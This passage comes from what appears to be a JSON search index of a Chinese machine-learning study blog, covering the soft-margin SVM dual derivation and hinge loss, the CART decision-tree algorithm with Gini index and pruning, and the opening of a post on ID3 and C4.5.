\\xi,\\mu)\\]我们可以先求优化函数对于$w$,$ b$, $\\xi$的极小值, 接着再求拉格朗日乘子$\\alpha$和 $\\mu$的极大值。首先我们来求优化函数对于$w$,$ b$, $\\xi$的极小值，这个可以通过求偏导数求得：\\[\\frac{\\partial L}{\\partial w} = 0 \\;\\Rightarrow w = \\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i\\]\\[\\frac{\\partial L}{\\partial b} = 0 \\;\\Rightarrow \\sum\\limits_{i=1}^{m}\\alpha_iy_i = 0\\]\\[\\frac{\\partial L}{\\partial \\xi} = 0 \\;\\Rightarrow C- \\alpha_i - \\mu_i = 0\\]好了，我们可以利用上面的三个式子去消除$w$和$b$了。\\(\\begin{align} L(w,b,\\xi,\\alpha,\\mu) &amp;amp; = \\frac{1}{2}||w||_2^2 +C\\sum\\limits_{i=1}^{m}\\xi_i - \\sum\\limits_{i=1}^{m}\\alpha_i[y_i(w^Tx_i + b) - 1 + \\xi_i] - \\sum\\limits_{i=1}^{m}\\mu_i\\xi_i 　\\\\&amp;amp;= \\frac{1}{2}||w||_2^2 - \\sum\\limits_{i=1}^{m}\\alpha_i[y_i(w^Tx_i + b) - 1 + \\xi_i] + \\sum\\limits_{i=1}^{m}\\alpha_i\\xi_i \\\\&amp;amp; = \\frac{1}{2}||w||_2^2 - \\sum\\limits_{i=1}^{m}\\alpha_i[y_i(w^Tx_i + b) - 1] \\\\&amp;amp; = \\frac{1}{2}w^Tw-\\sum\\limits_{i=1}^{m}\\alpha_iy_iw^Tx_i - \\sum\\limits_{i=1}^{m}\\alpha_iy_ib + \\sum\\limits_{i=1}^{m}\\alpha_i \\\\&amp;amp; = \\frac{1}{2}w^T\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i -\\sum\\limits_{i=1}^{m}\\alpha_iy_iw^Tx_i - \\sum\\limits_{i=1}^{m}\\alpha_iy_ib + \\sum\\limits_{i=1}^{m}\\alpha_i \\\\&amp;amp; = \\frac{1}{2}w^T\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i - w^T\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i - \\sum\\limits_{i=1}^{m}\\alpha_iy_ib + \\sum\\limits_{i=1}^{m}\\alpha_i \\\\&amp;amp; = - \\frac{1}{2}w^T\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i - \\sum\\limits_{i=1}^{m}\\alpha_iy_ib + \\sum\\limits_{i=1}^{m}\\alpha_i \\\\&amp;amp; = - \\frac{1}{2}w^T\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i - b\\sum\\limits_{i=1}^{m}\\alpha_iy_i + \\sum\\limits_{i=1}^{m}\\alpha_i \\\\&amp;amp; = -\\frac{1}{2}(\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i)^T(\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i) - b\\sum\\limits_{i=1}^{m}\\alpha_iy_i + \\sum\\limits_{i=1}^{m}\\alpha_i \\\\&amp;amp; = -\\frac{1}{2}\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i^T\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i - b\\sum\\limits_{i=1}^{m}\\alpha_iy_i + \\sum\\limits_{i=1}^{m}\\alpha_i \\\\&amp;amp; = -\\frac{1}{2}\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i^T\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i + \\sum\\limits_{i=1}^{m}\\alpha_i \\\\&amp;amp; = -\\frac{1}{2}\\sum\\limits_{i=1,j=1}^{m}\\alpha_iy_ix_i^T\\alpha_jy_jx_j + \\sum\\limits_{i=1}^{m}\\alpha_i \\\\&amp;amp; = \\sum\\limits_{i=1}^{m}\\alpha_i - \\frac{1}{2}\\sum\\limits_{i=1,j=1}^{m}\\alpha_i\\alpha_jy_iy_jx_i^Tx_j \\end{align}\\)其中，(1)式到(2)式用到了$C- \\alpha_i - \\mu_i = 0$, (2)式到(3)式合并了同类项，(3)式到(4)式用到了范数的定义$||w||_2^2 =w^Tw$(4)式到(5)式用到了上面的$w = \\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i$， (5)式到(6)式把和样本无关的$w^T$提前，(6)式到(7)式合并了同类项，(7)式到(8)式把和样本无关的$b$提前，(8)式到(9)式继续用到$w = \\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i$，（9）式到(10)式用到了向量的转置。由于常量的转置是其本身，所有只有向量$x_i$被转置，（10）式到(11)式用到了上面的$\\sum\\limits_{i=1}^{m}\\alpha_iy_i = 0$，（11）式到(12)式使用了(a+b+c+…)(a+b+c+…)=aa+ab+ac+ba+bb+bc+…的乘法运算法则，（12）式到(13)式仅仅是位置的调整。仔细观察可以发现，这个式子和我们上一篇线性可分SVM的一样。唯一不一样的是约束条件。现在我们看看我们的优化目标的数学形式：\\[\\underbrace{ max }_{\\alpha} \\sum\\limits_{i=1}^{m}\\alpha_i - \\frac{1}{2}\\sum\\limits_{i=1,j=1}^{m}\\alpha_i\\alpha_jy_iy_jx_i^Tx_j\\]\\[s.t. \\; \\sum\\limits_{i=1}^{m}\\alpha_iy_i = 0\\]\\[C- \\alpha_i - \\mu_i = 0\\]\\[\\alpha_i \\geq 0 \\;(i =1,2,...,m)\\]\\[\\mu_i \\geq 0 \\;(i =1,2,...,m)\\]对于$C- \\alpha_i - \\mu_i = 0$ ， $\\alpha_i \\geq 0$ ，$\\mu_i \\geq 0$这3个式子，我们可以消去$\\mu_i$，只留下$\\alpha_i$，也就是说$0 \\leq \\alpha_i \\leq C$。 同时将优化目标函数变号，求极小值，如下：\\[\\underbrace{ min }_{\\alpha} \\frac{1}{2}\\sum\\limits_{i=1,j=1}^{m}\\alpha_i\\alpha_jy_iy_jx_i^Tx_j - \\sum\\limits_{i=1}^{m}\\alpha_i\\]\\[s.t. \\; \\sum\\limits_{i=1}^{m}\\alpha_iy_i = 0\\]\\[0 \\leq \\alpha_i \\leq C\\]这就是软间隔最大化时的线性可分SVM的优化目标形式，和上一篇的硬间隔最大化的线性可分SVM相比，我们仅仅是多了一个约束条件$0 \\leq \\alpha_i \\leq C$。我们依然可以通过SMO算法来求上式极小化时对应的$\\alpha$向量就可以求出$w$和$b$了。4. 软间隔最大化时的支持向量在硬间隔最大化时，支持向量比较简单，就是满足$y_i(w^Tx_i + b) -1 =0$就可以了。根据KKT条件中的对偶互补条件$\\alpha_{i}^{*}(y_i(w^Tx_i + b) - 1) = 0$，如果$\\alpha_{i}^{*}&amp;gt;0$则有$y_i(w^Tx_i + b) =1$ 即点在支持向量上，否则如果$\\alpha_{i}^{*}=0$则有$y_i(w^Tx_i + b) \\geq 1$，即样本在支持向量上或者已经被正确分类。在软间隔最大化时，则稍微复杂一些，因为我们对每个样本$(x_i,y_i)$引入了松弛变量$\\xi_i$。我们从下图来研究软间隔最大化时支持向量的情况，第i个点到对应类别支持向量的距离为$\\frac{\\xi_i}{||w||_2}$根据软间隔最大化时KKT条件中的对偶互补条件$\\alpha_{i}^{*}(y_i(w^Tx_i + b) - 1 + \\xi_i^{*}) = 0$我们有： 如果$\\alpha = 0$,那么$y_i(w^Tx_i + b) - 1 \\geq 0$,即样本在间隔边界上或者已经被正确分类。如图中所有远离间隔边界的点。 如果$0 &amp;lt; \\alpha &amp;lt; C$,那么$\\xi_i = 0 ,\\;\\; y_i(w^Tx_i + b) - 1 = 0$,即点在间隔边界上。 如果$\\alpha = C$，说明这是一个可能比较异常的点，需要检查此时$\\xi_i$ 如果$0 \\leq \\xi_i \\leq 1$,那么点被正确分类，但是却在超平面和自己类别的间隔边界之间。如图中的样本2和4 如果$\\xi_i =1$,那么点在分离超平面上，无法被正确分类 如果$\\xi_i &amp;gt; 1$,那么点在超平面的另一侧，也就是说，这个点不能被正常分类。如图中的样本1和3. 5. 软间隔最大化的线性可分SVM的算法过程这里我们对软间隔最大化时的线性可分SVM的算法过程做一个总结。输入是线性可分的m个样本${(x_1,y_1), (x_2,y_2), …, (x_m,y_m),}$,其中$x$为n维特征向量。$y$为二元输出，值为1，或者-1.输出是分离超平面的参数$w^{*}$和$b^{*}$和分类决策函数。算法过程如下：1）选择一个惩罚系数$C&amp;gt;0$, 构造约束优化问题\\[\\underbrace{ min }_{\\alpha} \\frac{1}{2}\\sum\\limits_{i=1,j=1}^{m}\\alpha_i\\alpha_jy_iy_jx_i^Tx_j - \\sum\\limits_{i=1}^{m}\\alpha_i\\]\\[s.t. \\; \\sum\\limits_{i=1}^{m}\\alpha_iy_i = 0\\]\\[0 \\leq \\alpha_i \\leq C\\]2）用SMO算法求出上式最小时对应的$\\alpha$向量的值$\\alpha^{*}$向量.3) 计算$w^{*} = \\sum\\limits_{i=1}^{m}\\alpha_i^{*}y_ix_i$4) 找出所有的S个支持向量,即满足$0 &amp;lt; \\alpha_s &amp;lt; C$对应的样本$(x_s,y_s)$，通过$ y_s(\\sum\\limits_{i=1}^{S}\\alpha_iy_ix_i^Tx_s+b) = 1$，计算出每个支持向量$(x_x, y_s)$对应的$b_s^{*}$,计算出这些$b_s^{*} = y_s - \\sum\\limits_{i=1}^{S}\\alpha_iy_ix_i^Tx_s$. 所有的$b_s^{*}$对应的平均值即为最终的$b^{*} = \\frac{1}{S}\\sum\\limits_{i=1}^{S}b_s^{*}$这样最终的分类超平面为：$w^{*} \\bullet x + b^{*} = 0$，最终的分类决策函数为：$f(x) = sign(w^{*} \\bullet x + b^{*})$6. 合页损失函数线性支持向量机还有另外一种解释如下：\\[\\underbrace{ min}_{w, b}[1-y_i(w \\bullet x + b)]_{+} + \\lambda ||w||_2^2\\]其中$L(y(w \\bullet x + b)) = [1-y_i(w \\bullet x + b)]_{+}$称为合页损失函数(hinge loss function)，下标+表示为：\\[[z]_{+}= \\begin{cases} z &amp;amp; {z &amp;gt;0} \\\\ 0&amp;amp; {z\\leq 0} \\end{cases}\\]也就是说，如果点被正确分类，且函数间隔大于1，损失是0，否则损失是$1-y(w \\bullet x + b)$,如下图中的绿线。我们在下图还可以看出其他各种模型损失和函数间隔的关系：对于0-1损失函数，如果正确分类，损失是0，误分类损失1， 如下图黑线，可见0-1损失函数是不可导的。对于感知机模型，感知机的损失函数是$[-y_i(w \\bullet x + b)]_{+}$，这样当样本被正确分类时，损失是0，误分类时，损失是$-y_i(w \\bullet x + b)$，如下图紫线。对于逻辑回归之类和最大熵模型对应的对数损失，损失函数是$log[1+exp(-y(w \\bullet x + b))]$, 如下图红线所示。线性可分SVM通过软间隔最大化，可以解决线性数据集带有异常点时的分类处理，但是现实生活中的确有很多数据不是线性可分的，这些线性不可分的数据也不是去掉异常点就能处理这么简单。那么SVM怎么能处理中这样的情况呢？我们在下一篇就来讨论线性不可分SVM和核函数的原理。参考文献：http://www.cnblogs.com/pinard/p/6100722.html" }, { "title": "决策树算法原理（下）", "url": "/posts/%E5%86%B3%E7%AD%96%E6%A0%91%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86-%E4%B8%8B/", "categories": "学习笔记", "tags": "机器学习", "date": "2018-08-15 00:00:00 +0800", "snippet": "在决策树算法原理(上)这篇里，我们讲到了决策树里ID3算法，和ID3算法的改进版C4.5算法。对于C4.5算法，我们也提到了它的不足，比如模型是用较为复杂的熵来度量，使用了相对较为复杂的多叉树，只能处理分类不能处理回归等。对于这些问题， CART算法大部分做了改进。CART算法也就是我们下面的重点了。由于CART算法可以做回归，也可以做分类，我们分别加以介绍，先从CART分类树算法开始，重点比较和C4.5算法的不同点。接着介绍CART回归树算法，重点介绍和CART分类树的不同点。然后我们讨论CART树的建树算法和剪枝算法，最后总结决策树算法的优缺点。1. CART分类树算法的最优特征选择方法我们知道，在ID3算法中我们使用了信息增益来选择特征，信息增益大的优先选择。在C4.5算法中，采用了信息增益比来选择特征，以减少信息增益容易选择特征值多的特征的问题。但是无论是ID3还是C4.5,都是基于信息论的熵模型的，这里面会涉及大量的对数运算。能不能简化模型同时也不至于完全丢失熵模型的优点呢？有！CART分类树算法使用基尼系数来代替信息增益比，基尼系数代表了模型的不纯度，基尼系数越小，则不纯度越低，特征越好。这和信息增益(比)是相反的。具体的，在分类问题中，假设有K个类别，第k个类别的概率为$p_k$, 则基尼系数的表达式为：\\[Gini(p) = \\sum\\limits_{k=1}^{K}p_k(1-p_k) = 1- \\sum\\limits_{k=1}^{K}p_k^2\\]如果是二类分类问题，计算就更加简单了，如果属于第一个样本输出的概率是p，则基尼系数的表达式为：\\[Gini(p) = 2p(1-p)\\]对于个给定的样本D,假设有K个类别, 第k个类别的数量为$C_k$,则样本D的基尼系数表达式为：\\[Gini(D) = 1-\\sum\\limits_{k=1}^{K}(\\frac{|C_k|}{|D|})^2\\]特别的，对于样本D,如果根据特征A的某个值a,把D分成D1和D2两部分，则在特征A的条件下，D的基尼系数表达式为：\\[Gini(D,A) = \\frac{|D_1|}{|D|}Gini(D_1) + \\frac{|D_2|}{|D|}Gini(D_2)\\]大家可以比较下基尼系数表达式和熵模型的表达式，二次运算是不是比对数简单很多？尤其是二类分类的计算，更加简单。但是简单归简单，和熵模型的度量方式比，基尼系数对应的误差有多大呢？对于二类分类，基尼系数和熵之半的曲线如下：从上图可以看出，基尼系数和熵之半的曲线非常接近，仅仅在45度角附近误差稍大。因此，基尼系数可以做为熵模型的一个近似替代。而CART分类树算法就是使用的基尼系数来选择决策树的特征。同时，为了进一步简化，CART分类树算法每次仅仅对某个特征的值进行二分，而不是多分，这样CART分类树算法建立起来的是二叉树，而不是多叉树。这样一可以进一步简化基尼系数的计算，二可以建立一个更加优雅的二叉树模型。2. CART分类树算法对于连续特征和离散特征处理的改进对于CART分类树连续值的处理问题，其思想和C4.5是相同的，都是将连续的特征离散化。唯一的区别在于在选择划分点时的度量方式不同，C4.5使用的是信息增益比，则CART分类树使用的是基尼系数。具体的思路如下，比如m个样本的连续特征A有m个，从小到大排列为${a_1,a_2,…,a_m}$,则CART算法取相邻两样本值的平均数，一共取得m-1个划分点，其中第i个划分点$T_i$表示为：$T_i = \\frac{a_i+a_{i+1}}{2}$。对于这m-1个点，分别计算以该点作为二元分类点时的基尼系数。选择基尼系数最小的点作为该连续特征的二元离散分类点。比如取到的基尼系数最小的点为$a_t$,则小于$a_t$的值为类别1，大于$a_t$的值为类别2，这样我们就做到了连续特征的离散化。要注意的是，与ID3或者C4.5处理离散属性不同的是，如果当前节点为连续属性，则该属性后面还可以参与子节点的产生选择过程。对于CART分类树离散值的处理问题，采用的思路是不停的二分离散特征。回忆下ID3或者C4.5，如果某个特征A被选取建立决策树节点，如果它有A1,A2,A3三种类别，我们会在决策树上一下建立一个三叉的节点。这样导致决策树是多叉树。但是CART分类树使用的方法不同，他采用的是不停的二分，还是这个例子，CART分类树会考虑把A分成{A1}和{A2,A3}, {A2}和{A1,A3}, {A3}和{A1,A2}三种情况，找到基尼系数最小的组合，比如{A2}和{A1,A3},然后建立二叉树节点，一个节点是A2对应的样本，另一个节点是{A1,A3}对应的节点。同时，由于这次没有把特征A的取值完全分开，后面我们还有机会在子节点继续选择到特征A来划分A1和A3。这和ID3或者C4.5不同，在ID3或者C4.5的一棵子树中，离散特征只会参与一次节点的建立。3. CART分类树建立算法的具体流程上面介绍了CART算法的一些和C4.5不同之处，下面我们看看CART分类树建立算法的具体流程，之所以加上了建立，是因为CART树算法还有独立的剪枝算法这一块，这块我们在第5节讲。算法输入是训练集D，基尼系数的阈值，样本个数阈值。输出是决策树T。我们的算法从根节点开始，用训练集递归的建立CART树。1) 对于当前节点的数据集为D，如果样本个数小于阈值或者没有特征，则返回决策子树，当前节点停止递归。2) 计算样本集D的基尼系数，如果基尼系数小于阈值，则返回决策树子树，当前节点停止递归。3) 计算当前节点现有的各个特征的各个特征值对数据集D的基尼系数，对于离散值和连续值的处理方法和基尼系数的计算见第二节。缺失值的处理方法和上篇的C4.5算法里描述的相同。4) 在计算出来的各个特征的各个特征值对数据集D的基尼系数中，选择基尼系数最小的特征A和对应的特征值a。根据这个最优特征和最优特征值，把数据集划分成两部分D1和D2，同时建立当前节点的左右节点，做节点的数据集D为D1，右节点的数据集D为D2.5) 对左右的子节点递归的调用1-4步，生成决策树。对于生成的决策树做预测的时候，假如测试集里的样本A落到了某个叶子节点，而节点里有多个训练样本。则对于A的类别预测采用的是这个叶子节点里概率最大的类别。4. CART回归树建立算法CART回归树和CART分类树的建立算法大部分是类似的，所以这里我们只讨论CART回归树和CART分类树的建立算法不同的地方。首先，我们要明白，什么是回归树，什么是分类树。两者的区别在于样本输出，如果样本输出是离散值，那么这是一颗分类树。如果果样本输出是连续值，那么那么这是一颗回归树。除了概念的不同，CART回归树和CART分类树的建立和预测的区别主要有下面两点： 连续值的处理方法不同 决策树建立后做预测的方式不同。对于连续值的处理，我们知道CART分类树采用的是用基尼系数的大小来度量特征的各个划分点的优劣情况。这比较适合分类模型，但是对于回归模型，我们使用了常见的和方差的度量方式，CART回归树的度量目标是，对于任意划分特征A，对应的任意划分点s两边划分成的数据集D1和D2，求出使D1和D2各自集合的均方差最小，同时D1和D2的均方差之和最小所对应的特征和特征值划分点。表达式为：\\[\\underbrace{min}_{A,s}\\Bigg[\\underbrace{min}_{c_1}\\sum\\limits_{x_i \\in D_1(A,s)}(y_i - c_1)^2 + \\underbrace{min}_{c_2}\\sum\\limits_{x_i \\in D_2(A,s)}(y_i - c_2)^2\\Bigg]\\]其中，$c_1$为$D1$数据集的样本输出均值，$c_2$为$D2$数据集的样本输出均值。对于决策树建立后做预测的方式，上面讲到了CART分类树采用叶子节点里概率最大的类别作为当前节点的预测类别。而回归树输出不是类别，它采用的是用最终叶子的均值或者中位数来预测输出结果。除了上面提到了以外，CART回归树和CART分类树的建立算法和预测没有什么区别。5. CART树算法的剪枝CART回归树和CART分类树的剪枝策略除了在度量损失的时候一个使用均方差，一个使用基尼系数，算法基本完全一样，这里我们一起来讲。由于决策时算法很容易对训练集过拟合，而导致泛化能力差，为了解决这个问题，我们需要对CART树进行剪枝，即类似于线性回归的正则化，来增加决策树的泛化能力。但是，有很多的剪枝方法，我们应该这么选择呢？CART采用的办法是后剪枝法，即先生成决策树，然后产生所有可能的剪枝后的CART树，然后使用交叉验证来检验各种剪枝的效果，选择泛化能力最好的剪枝策略。也就是说，CART树的剪枝算法可以概括为两步，第一步是从原始决策树生成各种剪枝效果的决策树，第二部是用交叉验证来检验剪枝后的预测能力，选择泛化预测能力最好的剪枝后的数作为最终的CART树。首先我们看看剪枝的损失函数度量，在剪枝的过程中，对于任意的一刻子树T,其损失函数为：\\[C_{\\alpha}(T_t) = C(T_t) + \\alpha |T_t|\\]其中，$\\alpha$为正则化参数，这和线性回归的正则化一样。$C(T_t)$为训练数据的预测误差，分类树是用基尼系数度量，回归树是均方差度量。$|T_t|$是子树T的叶子节点的数量。当$\\alpha = 0$时，即没有正则化，原始的生成的CART树即为最优子树。当$\\alpha = \\infty$时，即正则化强度达到最大，此时由原始的生成的CART树的根节点组成的单节点树为最优子树。当然，这是两种极端情况。一般来说，$\\alpha$越大，则剪枝剪的越厉害，生成的最优子树相比原生决策树就越偏小。对于固定的$\\alpha$，一定存在使损失函数$C_{\\alpha}(T)$最小的唯一子树。看过剪枝的损失函数度量后，我们再来看看剪枝的思路，对于位于节点t的任意一颗子树$T_t$，如果没有剪枝，它的损失是\\[C_{\\alpha}(T_t) = C(T_t) + \\alpha |T_t|\\]如果将其剪掉，仅仅保留根节点，则损失是\\[C_{\\alpha}(T) = C(T) + \\alpha\\]当$\\alpha = 0$或者$\\alpha$很小时，$C_{\\alpha}(T_t) &amp;lt; C_{\\alpha}(T)$ , 当$\\alpha$增大到一定的程度时\\[C_{\\alpha}(T_t) = C_{\\alpha}(T)\\]当$\\alpha$继续增大时不等式反向，也就是说，如果满足下式：\\[\\alpha = \\frac{C(T)-C(T_t)}{|T_t|-1}\\]$T_t$和$T$有相同的损失函数，但是$T$节点更少，因此可以对子树$T_t$进行剪枝，也就是将它的子节点全部剪掉，变为一个叶子节点T。最后我们看看CART树的交叉验证策略。上面我们讲到，可以计算出每个子树是否剪枝的阈值$\\alpha$，如果我们把所有的节点是否剪枝的值$\\alpha$都计算出来，然后分别针对不同的$\\alpha$所对应的剪枝后的最优子树做交叉验证。这样就可以选择一个最好的$\\alpha$，有了这个$\\alpha$，我们就可以用对应的最优子树作为最终结果。好了，有了上面的思路，我们现在来看看CART树的剪枝算法。输入是CART树建立算法得到的原始决策树T。输出是最优决策子树$T_\\alpha$。算法过程如下：1）初始化$\\alpha_{min}= \\infty$， 最优子树集合$\\omega={T}$。2）从叶子节点开始自下而上计算各内部节点t的训练误差损失函数$C_{\\alpha}(T_t)$（回归树为均方差，分类树为基尼系数）, 叶子节点数$|T_t|$，以及正则化阈值$\\alpha= min{\\frac{C(T)-C(T_t)}{|T_t|-1}$, $\\alpha_{min}}$, 更新$\\alpha_{min}= \\alpha$3) 得到所有节点的$\\alpha$值的集合M。4）从M中选择最大的值$\\alpha_k$，自上而下的访问子树t的内部节点，如果$\\frac{C(T)-C(T_t)}{|T_t|-1} \\leq \\alpha_k$时，进行剪枝。并决定叶节点t的值。如果是分类树，则是概率最高的类别，如果是回归树，则是所有样本输出的均值。这样得到$\\alpha_k$对应的最优子树$T_k$5）最优子树集合$\\omega=\\omega \\cup T_k$， $M= M -{\\alpha_k}$。6) 如果M不为空，则回到步骤4。否则就已经得到了所有的可选最优子树集合$\\omega$.7) 采用交叉验证在$\\omega$选择最优子树$T_\\alpha$6. CART算法小结上面我们对CART算法做了一个详细的介绍，CART算法相比C4.5算法的分类方法，采用了简化的二叉树模型，同时特征选择采用了近似的基尼系数来简化计算。当然CART树最大的好处是还可以做回归模型，这个C4.5没有。下表给出了ID3，C4.5和CART的一个比较总结。希望可以帮助大家理解。 算法 支持模型 树结构 特征选择 连续值处理 缺失值处理 剪枝 ID3 分类 多叉树 信息增益 不支持 不支持 不支持 C4.5 分类 多叉树 信息增益比 支持 支持 支持 CART 分类，回归 二叉树 基尼指数，均方差 支持 支持 支持 看起来CART算法高大上，那么CART算法还有没有什么缺点呢？有！主要的缺点我认为如下：1）应该大家有注意到，无论是ID3, C4.5还是CART,在做特征选择的时候都是选择最优的一个特征来做分类决策，但是大多数，分类决策不应该是由某一个特征决定的，而是应该由一组特征决定的。这样决策得到的决策树更加准确。这个决策树叫做多变量决策树(multi-variate decision tree)。在选择最优特征的时候，多变量决策树不是选择某一个最优特征，而是选择最优的一个特征线性组合来做决策。这个算法的代表是OC1，这里不多介绍。2）如果样本发生一点点的改动，就会导致树结构的剧烈改变。这个可以通过集成学习里面的随机森林之类的方法解决。　　　7. 决策树算法小结终于到了最后的总结阶段了，这里我们不再纠结于ID3, C4.5和 CART，我们来看看决策树算法作为一个大类别的分类回归算法的优缺点。这部分总结于scikit-learn的英文文档。首先我们看看决策树算法的优点：1）简单直观，生成的决策树很直观。2）基本不需要预处理，不需要提前归一化，处理缺失值。3）使用决策树预测的代价是O(log_2m)。 m为样本数。4）既可以处理离散值也可以处理连续值。很多算法只是专注于离散值或者连续值。5）可以处理多维度输出的分类问题。6）相比于神经网络之类的黑盒分类模型，决策树在逻辑上可以得到很好的解释7）可以交叉验证的剪枝来选择模型，从而提高泛化能力。8） 对于异常点的容错能力好，健壮性高。我们再看看决策树算法的缺点:1）决策树算法非常容易过拟合，导致泛化能力不强。可以通过设置节点最少样本数量和限制决策树深度来改进。2）决策树会因为样本发生一点点的改动，就会导致树结构的剧烈改变。这个可以通过集成学习之类的方法解决。3）寻找最优的决策树是一个NP难的问题，我们一般是通过启发式方法，容易陷入局部最优。可以通过集成学习之类的方法来改善。4）有些比较复杂的关系，决策树很难学习，比如异或。这个就没有办法了，一般这种关系可以换神经网络分类方法来解决。5）如果某些特征的样本比例过大，生成决策树容易偏向于这些特征。这个可以通过调节样本权重来改善。参考文献：https://www.cnblogs.com/pinard/p/6053344.html" }, { "title": "决策树算法原理（上）", "url": "/posts/%E5%86%B3%E7%AD%96%E6%A0%91%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86-%E4%B8%8A/", "categories": "学习笔记", "tags": "机器学习", "date": "2018-08-15 00:00:00 +0800", "snippet": "决策树算法在机器学习中算是很经典的一个算法系列了。它既可以作为分类算法，也可以作为回归算法，同时也特别适合集成学习比如随机森林。本文就对决策树算法原理做一个总结，上篇对ID3， C4.5的算法思想做了总结，下篇重点对CART算法做一个详细的介绍。选择CART做重点介绍的原因是scikit-learn使用了优化版的CART算法作为其决策树算法的实现。1. 决策树ID3算法的信息论基础机器学习算法其实很古老，作为一个码农经常会不停的敲if, else if, else,其实就已经在用到决策树的思想了。只是你有没有想过，有这么多条件，用哪个条件特征先做if，哪个条件特征后做if比较优呢？怎么准确的定量选择这个标准就是决策树机器学习算法的关键了。1970年代，一个叫昆兰的大牛找到了用信息论中的熵来度量决策树的决策选择过程，方法一出，它的简洁和高效就引起了轰动，昆兰把这个算法叫做ID3。下面我们就看看ID3算法是怎么选择特征的。首先，我们需要熟悉信息论中熵的概念。熵度量了事物的不确定性，越不确定的事物，它的熵就越大。具体的，随机变量X的熵的表达式如下：\\[H(X) = -\\sum\\limits_{i=1}^{n}p_i logp_i\\]其中n代表X的n种不同的离散取值。而$p_i$代表了X取值为i的概率，log为以2或者e为底的对数。举个例子，比如X有2个可能的取值，而这两个取值各为1/2时X的熵最大，此时X具有最大的不确定性。值为$H(X) = -(\\frac{1}{2}log\\frac{1}{2} + \\frac{1}{2}log\\frac{1}{2}) = log2$。如果一个值概率大于1/2，另一个值概率小于1/2，则不确定性减少，对应的熵也会减少。比如一个概率1/3，一个概率2/3，则对应熵为$H(X) = -(\\frac{1}{3}log\\frac{1}{3} + \\frac{2}{3}log\\frac{2}{3}) = log3 - \\frac{2}{3}log2 &amp;lt; log2)$熟悉了一个变量X的熵，很容易推广到多个个变量的联合熵，这里给出两个变量X和Y的联合熵表达式：\\[H(X,Y) = -\\sum\\limits_{i=1}^{n}p(x_i,y_i)logp(x_i,y_i)\\]有了联合熵，又可以得到条件熵的表达式$H(X|Y)$，条件熵类似于条件概率,它度量了我们的$X$在知道$Y$以后剩下的不确定性。表达式如下：\\[H(X|Y) = -\\sum\\limits_{i=1}^{n}p(x_i,y_i)logp(x_i|y_i) = \\sum\\limits_{j=1}^{n}p(y_j)H(X|y_j)\\]好吧，绕了一大圈，终于可以重新回到ID3算法了。我们刚才提到$H(X)$度量了$X$的不确定性，条件熵$H(X|Y)$度量了我们在知道$Y$以后$X$剩下的不确定性，那么$H(X)-H(X|Y)$呢？从上面的描述大家可以看出，它度量了$X$在知道$Y$以后不确定性减少程度，这个度量我们在信息论中称为互信息，记为$I(X,Y)$。在决策树ID3算法中叫做信息增益。ID3算法就是用信息增益来判断当前节点应该用什么特征来构建决策树。信息增益大，则越适合用来分类。上面一堆概念，大家估计比较晕，用下面这个图很容易明白他们的关系。左边的椭圆代表$H(X)$,右边的椭圆代表$H(Y)$,中间重合的部分就是我们的互信息或者信息增益$I(X,Y)$, 左边的椭圆去掉重合部分就是$H(X|Y)$,右边的椭圆去掉重合部分就是$H(Y|X)$。两个椭圆的并就是$H(X,Y)$。2. 决策树ID3算法的思路上面提到ID3算法就是用信息增益大小来判断当前节点应该用什么特征来构建决策树，用计算出的信息增益最大的特征来建立决策树的当前节点。这里我们举一个信息增益计算的具体的例子。比如我们有15个样本D，输出为0或者1。其中有9个输出为1， 6个输出为0。 样本中有个特征A，取值为A1，A2和A3。在取值为A1的样本的输出中，有3个输出为1， 2个输出为0，取值为A2的样本输出中,2个输出为1,3个输出为0， 在取值为A3的样本中，4个输出为1，1个输出为0.样本D的熵为： $H(D) = -(\\frac{9}{15}log_2\\frac{9}{15} + \\frac{6}{15}log_2\\frac{6}{15}) = 0.971$样本D在特征下的条件熵为：$ H(D|A) = \\frac{5}{15}H(D1) + \\frac{5}{15}H(D2) + \\frac{5}{15}H(D3)= \\ -\\frac{5}{15}(\\frac{3}{5}log_2\\frac{3}{5} + \\frac{2}{5}log_2\\frac{2}{5}) - \\frac{5}{15}(\\frac{2}{5}log_2\\frac{2}{5} + \\frac{3}{5}log_2\\frac{3}{5}) -\\frac{5}{15}(\\frac{4}{5}log_2\\frac{4}{5} + \\frac{1}{5}log_2\\frac{1}{5}) = 0.888$　　　　对应的信息增益为 $I(D,A) = H(D) - H(D|A) = 0.083　　　　　　$下面我们看看具体算法过程大概是怎么样的。输入的是$m$个样本，样本输出集合为$D$，每个样本有$n$个离散特征，特征集合即为$A$，输出为决策树$T$。算法的过程为：1)初始化信息增益的阈值$\\epsilon$2）判断样本是否为同一类输出$D_i$，如果是则返回单节点树$T$。标记类别为$D_i$3) 判断特征是否为空，如果是则返回单节点树$T$，标记类别为样本中输出类别$D$实例数最多的类别。4）计算$A$中的各个特征（一共$n$个）对输出$D$的信息增益，选择信息增益最大的特征$A_g$5) 如果$A_g$的信息增益小于阈值$\\epsilon$，则返回单节点树$T$，标记类别为样本中输出类别$D$实例数最多的类别。6）否则，按特征$A_g$的不同取值$A_{gi}$将对应的样本输出$D$分成不同的类别$D_i$。每个类别产生一个子节点。对应特征值为$A_{gi}$。返回增加了节点的数$T$。7）对于所有的子节点，令$D=D_i, A= A-{A_g}$递归调用2-6步，得到子树$T_i$并返回。决策树ID3算法的不足ID3算法虽然提出了新思路，但是还是有很多值得改进的地方。　　a)ID3没有考虑连续特征，比如长度，密度都是连续值，无法在ID3运用。这大大限制了ID3的用途。b)ID3采用信息增益大的特征优先建立决策树的节点。很快就被人发现，在相同条件下，取值比较多的特征比取值少的特征信息增益大。比如一个变量有2个值，各为1/2，另一个变量为3个值，各为1/3，其实他们都是完全不确定的变量，但是取3个值的比取2个值的信息增益大。如果校正这个问题呢？c) ID3算法对于缺失值的情况没有做考虑d) 